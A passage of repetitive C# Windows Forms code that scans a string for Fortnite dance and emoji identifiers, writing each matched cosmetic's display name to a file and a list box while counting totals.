                                    FnBattleRoyalLB.Items.Add("=> Ground Pound");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound135 = x.Contains("AthenaDance:eid_armupdance");
                            if (DancesFound135)
                            {
                                sw.WriteLine("=> Backstroke");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Backstroke");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound136 = x.Contains("AthenaDance:eid_cheerleading");
                            if (DancesFound136)
                            {
                                sw.WriteLine("=> Cheer Up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cheer Up");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound137 = x.Contains("AthenaDance:eid_crackshotdance");
                            if (DancesFound137)
                            {
                                sw.WriteLine("=> Crackdown");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crackdown");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound138 = x.Contains("AthenaDance:eid_getfunky");
                            if (DancesFound138)
                            {
                                sw.WriteLine("=> Get Funky");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Get Funky");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound139 = x.Contains("AthenaDance:eid_golfclap");
                            if (DancesFound139)
                            {
                                sw.WriteLine("=> Golf Clap");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Golf Clap");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound140 = x.Contains("AthenaDance:eid_hiphops7");
                            if (DancesFound140)
                            {
                                sw.WriteLine("=> Free Flow");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Free Flow");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound141 = x.Contains("AthenaDance:eid_iceking");
                            if (DancesFound141)
                            {
                                sw.WriteLine("=> Point It Out");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Point It Out");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound142 = x.Contains("AthenaDance:eid_jammin");
                            if (DancesFound142)
                            {
                                sw.WriteLine("=> Clean Groove");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Clean Groove");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound143 = x.Contains("AthenaDance:eid_kittycat");
                            if (DancesFound143)
                            {
                                sw.WriteLine("=> Cat Flip");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cat Flip");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound144 = x.Contains("AthenaDance:eid_lazyshuffle");
                            if (DancesFound144)
                            {
                                sw.WriteLine("=> Lazy Shuffle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lazy Shuffle");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound145 = x.Contains("AthenaDance:eid_micdrop");
                            if (DancesFound145)
                            {
                                sw.WriteLine("=> Mic Drop");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mic Drop");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound146 = x.Contains("AthenaDance:eid_mindblown");
                            if (DancesFound146)
                            {
                                sw.WriteLine("=> Mind Blown");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mind Blown");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound147 = x.Contains("AthenaDance:eid_presentopening");
                            if (DancesFound147)
                            {
                                sw.WriteLine("=> Unwrapped");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Unwrapped");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound148 = x.Contains("AthenaDance:eid_shaolin");
                            if (DancesFound148)
                            {
                                sw.WriteLine("=> Shaolin Sit-up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shaolin Sit-up");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound149 = x.Contains("AthenaDance:eid_taketheelf");
                            if (DancesFound149)
                            {
                                sw.WriteLine("=> Take the Elf");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Take the Elf");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound150 = x.Contains("AthenaDance:eid_wristflick");
                            if (DancesFound150)
                            {
                                sw.WriteLine("=> Shimmer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shimmer");
                                }
                                TotalDances = TotalDances + 1;
                            }
                        }
                        int TotalEmojis = 0;
                        if (CheckForEmojis.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Emoji's>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Emoji's>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            bool EmojiFindTime1 = x.Contains("emoji_badapple");
                            if (EmojiFindTime1)
                            {
                                sw.WriteLine("=> Bad Apple");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bad Apple");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime2 = x.Contains("emoji_embarrassed");
                            if (EmojiFindTime2)
                            {
                                sw.WriteLine("=> Embarrassed");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Embarrassed");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime3 = x.Contains("emoji_go");
                            if (EmojiFindTime3)
                            {
                                sw.WriteLine("=> Go");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Go");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime4 = x.Contains("emoji_poolparty");
                            if (EmojiFindTime4)
                            {
                                sw.WriteLine("=> Pool Party");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pool Party");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime5 = x.Contains("emoji_potofgold");
                            if (EmojiFindTime5)
                            {
                                sw.WriteLine("=> Pot of Gold");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pot of Gold");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime6 = x.Contains("emoji_prickly");
                            if (EmojiFindTime6)
                            {
                                sw.WriteLine("=> Prickly");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Prickly");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime7 = x.Contains("emoji_rockon");
                            if (EmojiFindTime7)
                            {
                                sw.WriteLine("=> Let's Rock");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Let's Rock");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime8 = x.Contains("emoji_stinky");
                            if (EmojiFindTime8)
                            {
                                sw.WriteLine("=> Stinky");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stinky");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime9 = x.Contains("emoji_stop");
                            if (EmojiFindTime9)
                            {
                                sw.WriteLine("=> Stop");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stop");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime10 = x.Contains("emoji_tasty");
                            if (EmojiFindTime10)
                            {
                                sw.WriteLine("=> Tasty");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tasty");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime11 = x.Contains("emoji_trap");
                            if (EmojiFindTime11)
                            {
                                sw.WriteLine("=> Trap");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Trap");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime12 = x.Contains("emoji_tattered");
                            if (EmojiFindTime12)
                            {
                                sw.WriteLine("=> Tattered");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tattered");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime13 = x.Contains("emoji_birthday2018");
                            if (EmojiFindTime13)
                            {
                                sw.WriteLine("=> Fortnite Birthday!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fortnite Birthday!");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime14 = x.Contains("emoji_ace");
                            if (EmojiFindTime14)
                            {
                                sw.WriteLine("=> Ace");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ace");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime15 = x.Contains("emoji_angel");
                            if (EmojiFindTime15)
                            {
                                sw.WriteLine("=> Angel");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Angel");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime16 = x.Contains("emoji_babyseal");
                            if (EmojiFindTime16)
                            {
                                sw.WriteLine("=> Baby Seal");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Baby Seal");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime17 = x.Contains("emoji_banana");
                            if (EmojiFindTime17)
                            {
                                sw.WriteLine("=> Bananas");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bananas");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime18 = x.Contains("emoji_camera");
                            if (EmojiFindTime18)
                            {
                                sw.WriteLine("=> Lights, Camera, Action!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lights, Camera, Action!");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime19 = x.Contains("emoji_celebrate");
                            if (EmojiFindTime19)
                            {
                                sw.WriteLine("=> Celebrate");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Celebrate");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime20 = x.Contains("emoji_chicken");
                            if (EmojiFindTime20)
                            {
                                sw.WriteLine("=> Chicken");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chicken");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime21 = x.Contains("emoji_crabby");
                            if (EmojiFindTime21)
                            {
                                sw.WriteLine("=> Crabby");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crabby");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime22 = x.Contains("emoji_dynamite");
                            if (EmojiFindTime22)
                            {
                                sw.WriteLine("=> Dynamite");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dynamite");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime23 = x.Contains("emoji_plotting");
                            if (EmojiFindTime23)
                            {
                                sw.WriteLine("=> Plotting");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Plotting");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime24 = x.Contains("emoji_rainbow");
                            if (EmojiFindTime24)
                            {
                                sw.WriteLine("=> Rainbow");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rainbow");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime25 = x.Contains("emoji_teamwork");
                            if (EmojiFindTime25)
                            {
                                sw.WriteLine("=> Teamwork");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Teamwork");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime26 = x.Contains("emoji_victoryroyale");
                            if (EmojiFindTime26)
                            {
                                sw.WriteLine("=> Victory Royale");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Victory Royale");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime27 = x.Contains("emoji_zzz");
                            if (EmojiFindTime27)
                            {
                                sw.WriteLine("=> Zzz");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Zzz");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime28 = x.Contains("emoji_100aplus");
                            if (EmojiFindTime28)
                            {
                                sw.WriteLine("=> 100");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> 100");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime29 = x.Contains("emoji_200iqplay");
                            if (EmojiFindTime29)
                            {
                                sw.WriteLine("=> 200 Iq Play");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> 200 Iq Play");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime30 = x.Contains("emoji_1hp");
                            if (EmojiFindTime30)
                            {
                                sw.WriteLine("=> 1 Hp");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> 1 Hp");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime31 = x.Contains("emoji_alarm");
                            if (EmojiFindTime31)
                            {
                                sw.WriteLine("=> Alarm");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Alarm");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime32 = x.Contains("emoji_aplus");
                            if (EmojiFindTime32)
                            {
                                sw.WriteLine("=> A+");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> A+");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime33 = x.Contains("emoji_armflex");
                            if (EmojiFindTime33)
                            {
                                sw.WriteLine("=> Flex");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flex");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime34 = x.Contains("emoji_awww");
                            if (EmojiFindTime34)
                            {
                                sw.WriteLine("=> Awww");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Awww");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime35 = x.Contains("emoji_baited");
                            if (EmojiFindTime35)
                            {
                                sw.WriteLine("=> Baited");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Baited");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime36 = x.Contains("emoji_bobwhat");
                            if (EmojiFindTime36)
                            {
                                sw.WriteLine("=> Bob What");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bob What");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime37 = x.Contains("emoji_boombox");
                            if (EmojiFindTime37)
                            {
                                sw.WriteLine("=> Boombox");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Boombox");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime38 = x.Contains("emoji_bullseye");
                            if (EmojiFindTime38)
                            {
                                sw.WriteLine("=> Bullseye");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bullseye");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime39 = x.Contains("emoji_bush");
                            if (EmojiFindTime39)
                            {
                                sw.WriteLine("=> Bush");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bush");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime40 = x.Contains("emoji_clapping");
                            if (EmojiFindTime40)
                            {
                                sw.WriteLine("=> Clapping");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Clapping");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime41 = x.Contains("emoji_dealwithit");
                            if (EmojiFindTime41)
                            {
                                sw.WriteLine("=> Deal With It");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Deal With It");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime42 = x.Contains("emoji_disco");
                            if (EmojiFindTime42)
                            {
                                sw.WriteLine("=> Dance Party");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dance Party");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime43 = x.Contains("emoji_exclamation");
                            if (EmojiFindTime43)
                            {
                                sw.WriteLine("=> Exclamation");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Exclamation");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime44 = x.Contains("emoji_explosion");
                            if (EmojiFindTime44)
                            {
                                sw.WriteLine("=> Explosion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Explosion");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime45 = x.Contains("emoji_fistbump");
                            if (EmojiFindTime45)
                            {
                                sw.WriteLine("=> Fist Bump");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fist Bump");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime46 = x.Contains("emoji_flamingrage");
                            if (EmojiFindTime46)
                            {
                                sw.WriteLine("=> Flaming Rage");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flaming Rage");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime47 = x.Contains("emoji_foamfinger");
                            if (EmojiFindTime47)
                            {
                                sw.WriteLine("=> Foam Finger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Foam Finger");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime48 = x.Contains("emoji_gg");
                            if (EmojiFindTime48)
                            {
                                sw.WriteLine("=> GG");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> GG");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime49 = x.Contains("emoji_goodgame");
                            if (EmojiFindTime49)
                            {
                                sw.WriteLine("=> Good Game");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Good Game");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime50 = x.Contains("emoji_headshot");
                            if (EmojiFindTime50)
                            {
                                sw.WriteLine("=> Headshot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Headshot");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime51 = x.Contains("emoji_heartbroken");
                            if (EmojiFindTime51)
                            {
                                sw.WriteLine("=> Heartbroken");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Heartbroken");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime52 = x.Contains("emoji_hearthands");
                            if (EmojiFindTime52)
                            {
                                sw.WriteLine("=> Heart Hands");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Heart Hands");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime53 = x.Contains("emoji_hoarder");
                            if (EmojiFindTime53)
                            {
                                sw.WriteLine("=> Hoarder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hoarder");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime54 = x.Contains("emoji_hotdawg");
                            if (EmojiFindTime54)
                            {
                                sw.WriteLine("=> Hot Dawg");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hot Dawg");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime55 = x.Contains("emoji_inlove");
                            if (EmojiFindTime55)
                            {
                                sw.WriteLine("=> In Love");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> In Love");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime56 = x.Contains("emoji_iseeyou");
                            if (EmojiFindTime56)
                            {
                                sw.WriteLine("=> I See You");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> I See You");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime57 = x.Contains("emoji_kaboom");
                            if (EmojiFindTime57)
                            {
                                sw.WriteLine("=> Kaboom");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Kaboom");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime58 = x.Contains("emoji_lol");
                            if (EmojiFindTime58)
                            {
                                sw.WriteLine("=> Lol");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lol");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime59 = x.Contains("emoji_lucky");
                            if (EmojiFindTime59)
                            {
                                sw.WriteLine("=> Lucky");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lucky");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime60 = x.Contains("emoji_majestic");
                            if (EmojiFindTime60)
                            {
                                sw.WriteLine("=> Majestic");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Majestic");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime61 = x.Contains("emoji_marybobbins");
                            if (EmojiFindTime61)
                            {
                                sw.WriteLine("=> Mary Bobbins");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mary Bobbins");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime62 = x.Contains("emoji_mvp");
                            if (EmojiFindTime62)
                            {
                                sw.WriteLine("=> Mvp");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mvp");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime63 = x.Contains("emoji_number1");
                            if (EmojiFindTime63)
                            {
                                sw.WriteLine("=> #1");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> #1");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime64 = x.Contains("emoji_onfire");
                            if (EmojiFindTime64)
                            {
                                sw.WriteLine("=> On Fire");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> On Fire");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime65 = x.Contains("emoji_peacesign");
                            if (EmojiFindTime65)
                            {
                                sw.WriteLine("=> Peace");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Peace");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime66 = x.Contains("emoji_pickaxe");
                            if (EmojiFindTime66)
                            {
                                sw.WriteLine("=> Pickaxe");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pickaxe");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime67 = x.Contains("emoji_placeholder");
                            if (EmojiFindTime67)
                            {
                                sw.WriteLine("=> Placeholder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Placeholder");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime68 = x.Contains("emoji_positivity");
                            if (EmojiFindTime68)
                            {
                                sw.WriteLine("=> Positivity");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Positivity");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime69 = x.Contains("emoji_potatoaim");
                            if (EmojiFindTime69)
                            {
                                sw.WriteLine("=> Potato Aim");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Potato Aim");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime70 = x.Contains("emoji_potion");
                            if (EmojiFindTime70)
                            {
                                sw.WriteLine("=> Shield Potion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shield Potion");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime71 = x.Contains("emoji_rabid");
                            if (EmojiFindTime71)
                            {
                                sw.WriteLine("=> Rabid");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rabid");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime72 = x.Contains("emoji_rage");
                            if (EmojiFindTime72)
                            {
                                sw.WriteLine("=> Rage");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rage");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime73 = x.Contains("emoji_rekt");
                            if (EmojiFindTime73)
                            {
                                sw.WriteLine("=> Rekt");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rekt");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime74 = x.Contains("emoji_rip");
                            if (EmojiFindTime74)
                            {
                                sw.WriteLine("=> Rip");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rip");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime75 = x.Contains("emoji_rock");
                            if (EmojiFindTime75)
                            {
                                sw.WriteLine("=> Let's Rock");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Let's Rock");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime76 = x.Contains("emoji_rocketride");
                            if (EmojiFindTime76)
                            {
                                sw.WriteLine("=> Rocket Ride");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rocket Ride");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime77 = x.Contains("emoji_salty");
                            if (EmojiFindTime77)
                            {
                                sw.WriteLine("=> Salty");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Salty");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime78 = x.Contains("emoji_stealthy");
                            if (EmojiFindTime78)
                            {
                                sw.WriteLine("=> Stealthy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stealthy");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime79 = x.Contains("emoji_storm");
                            if (EmojiFindTime79)
                            {
                                sw.WriteLine("=> Storm");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Storm");
                                }
                                TotalEmojis = TotalEmojis + 1;
                            }
                            bool EmojiFindTime80 = x.Contains("emoji_sucker");
                            if (EmojiFindTime80)
                            {
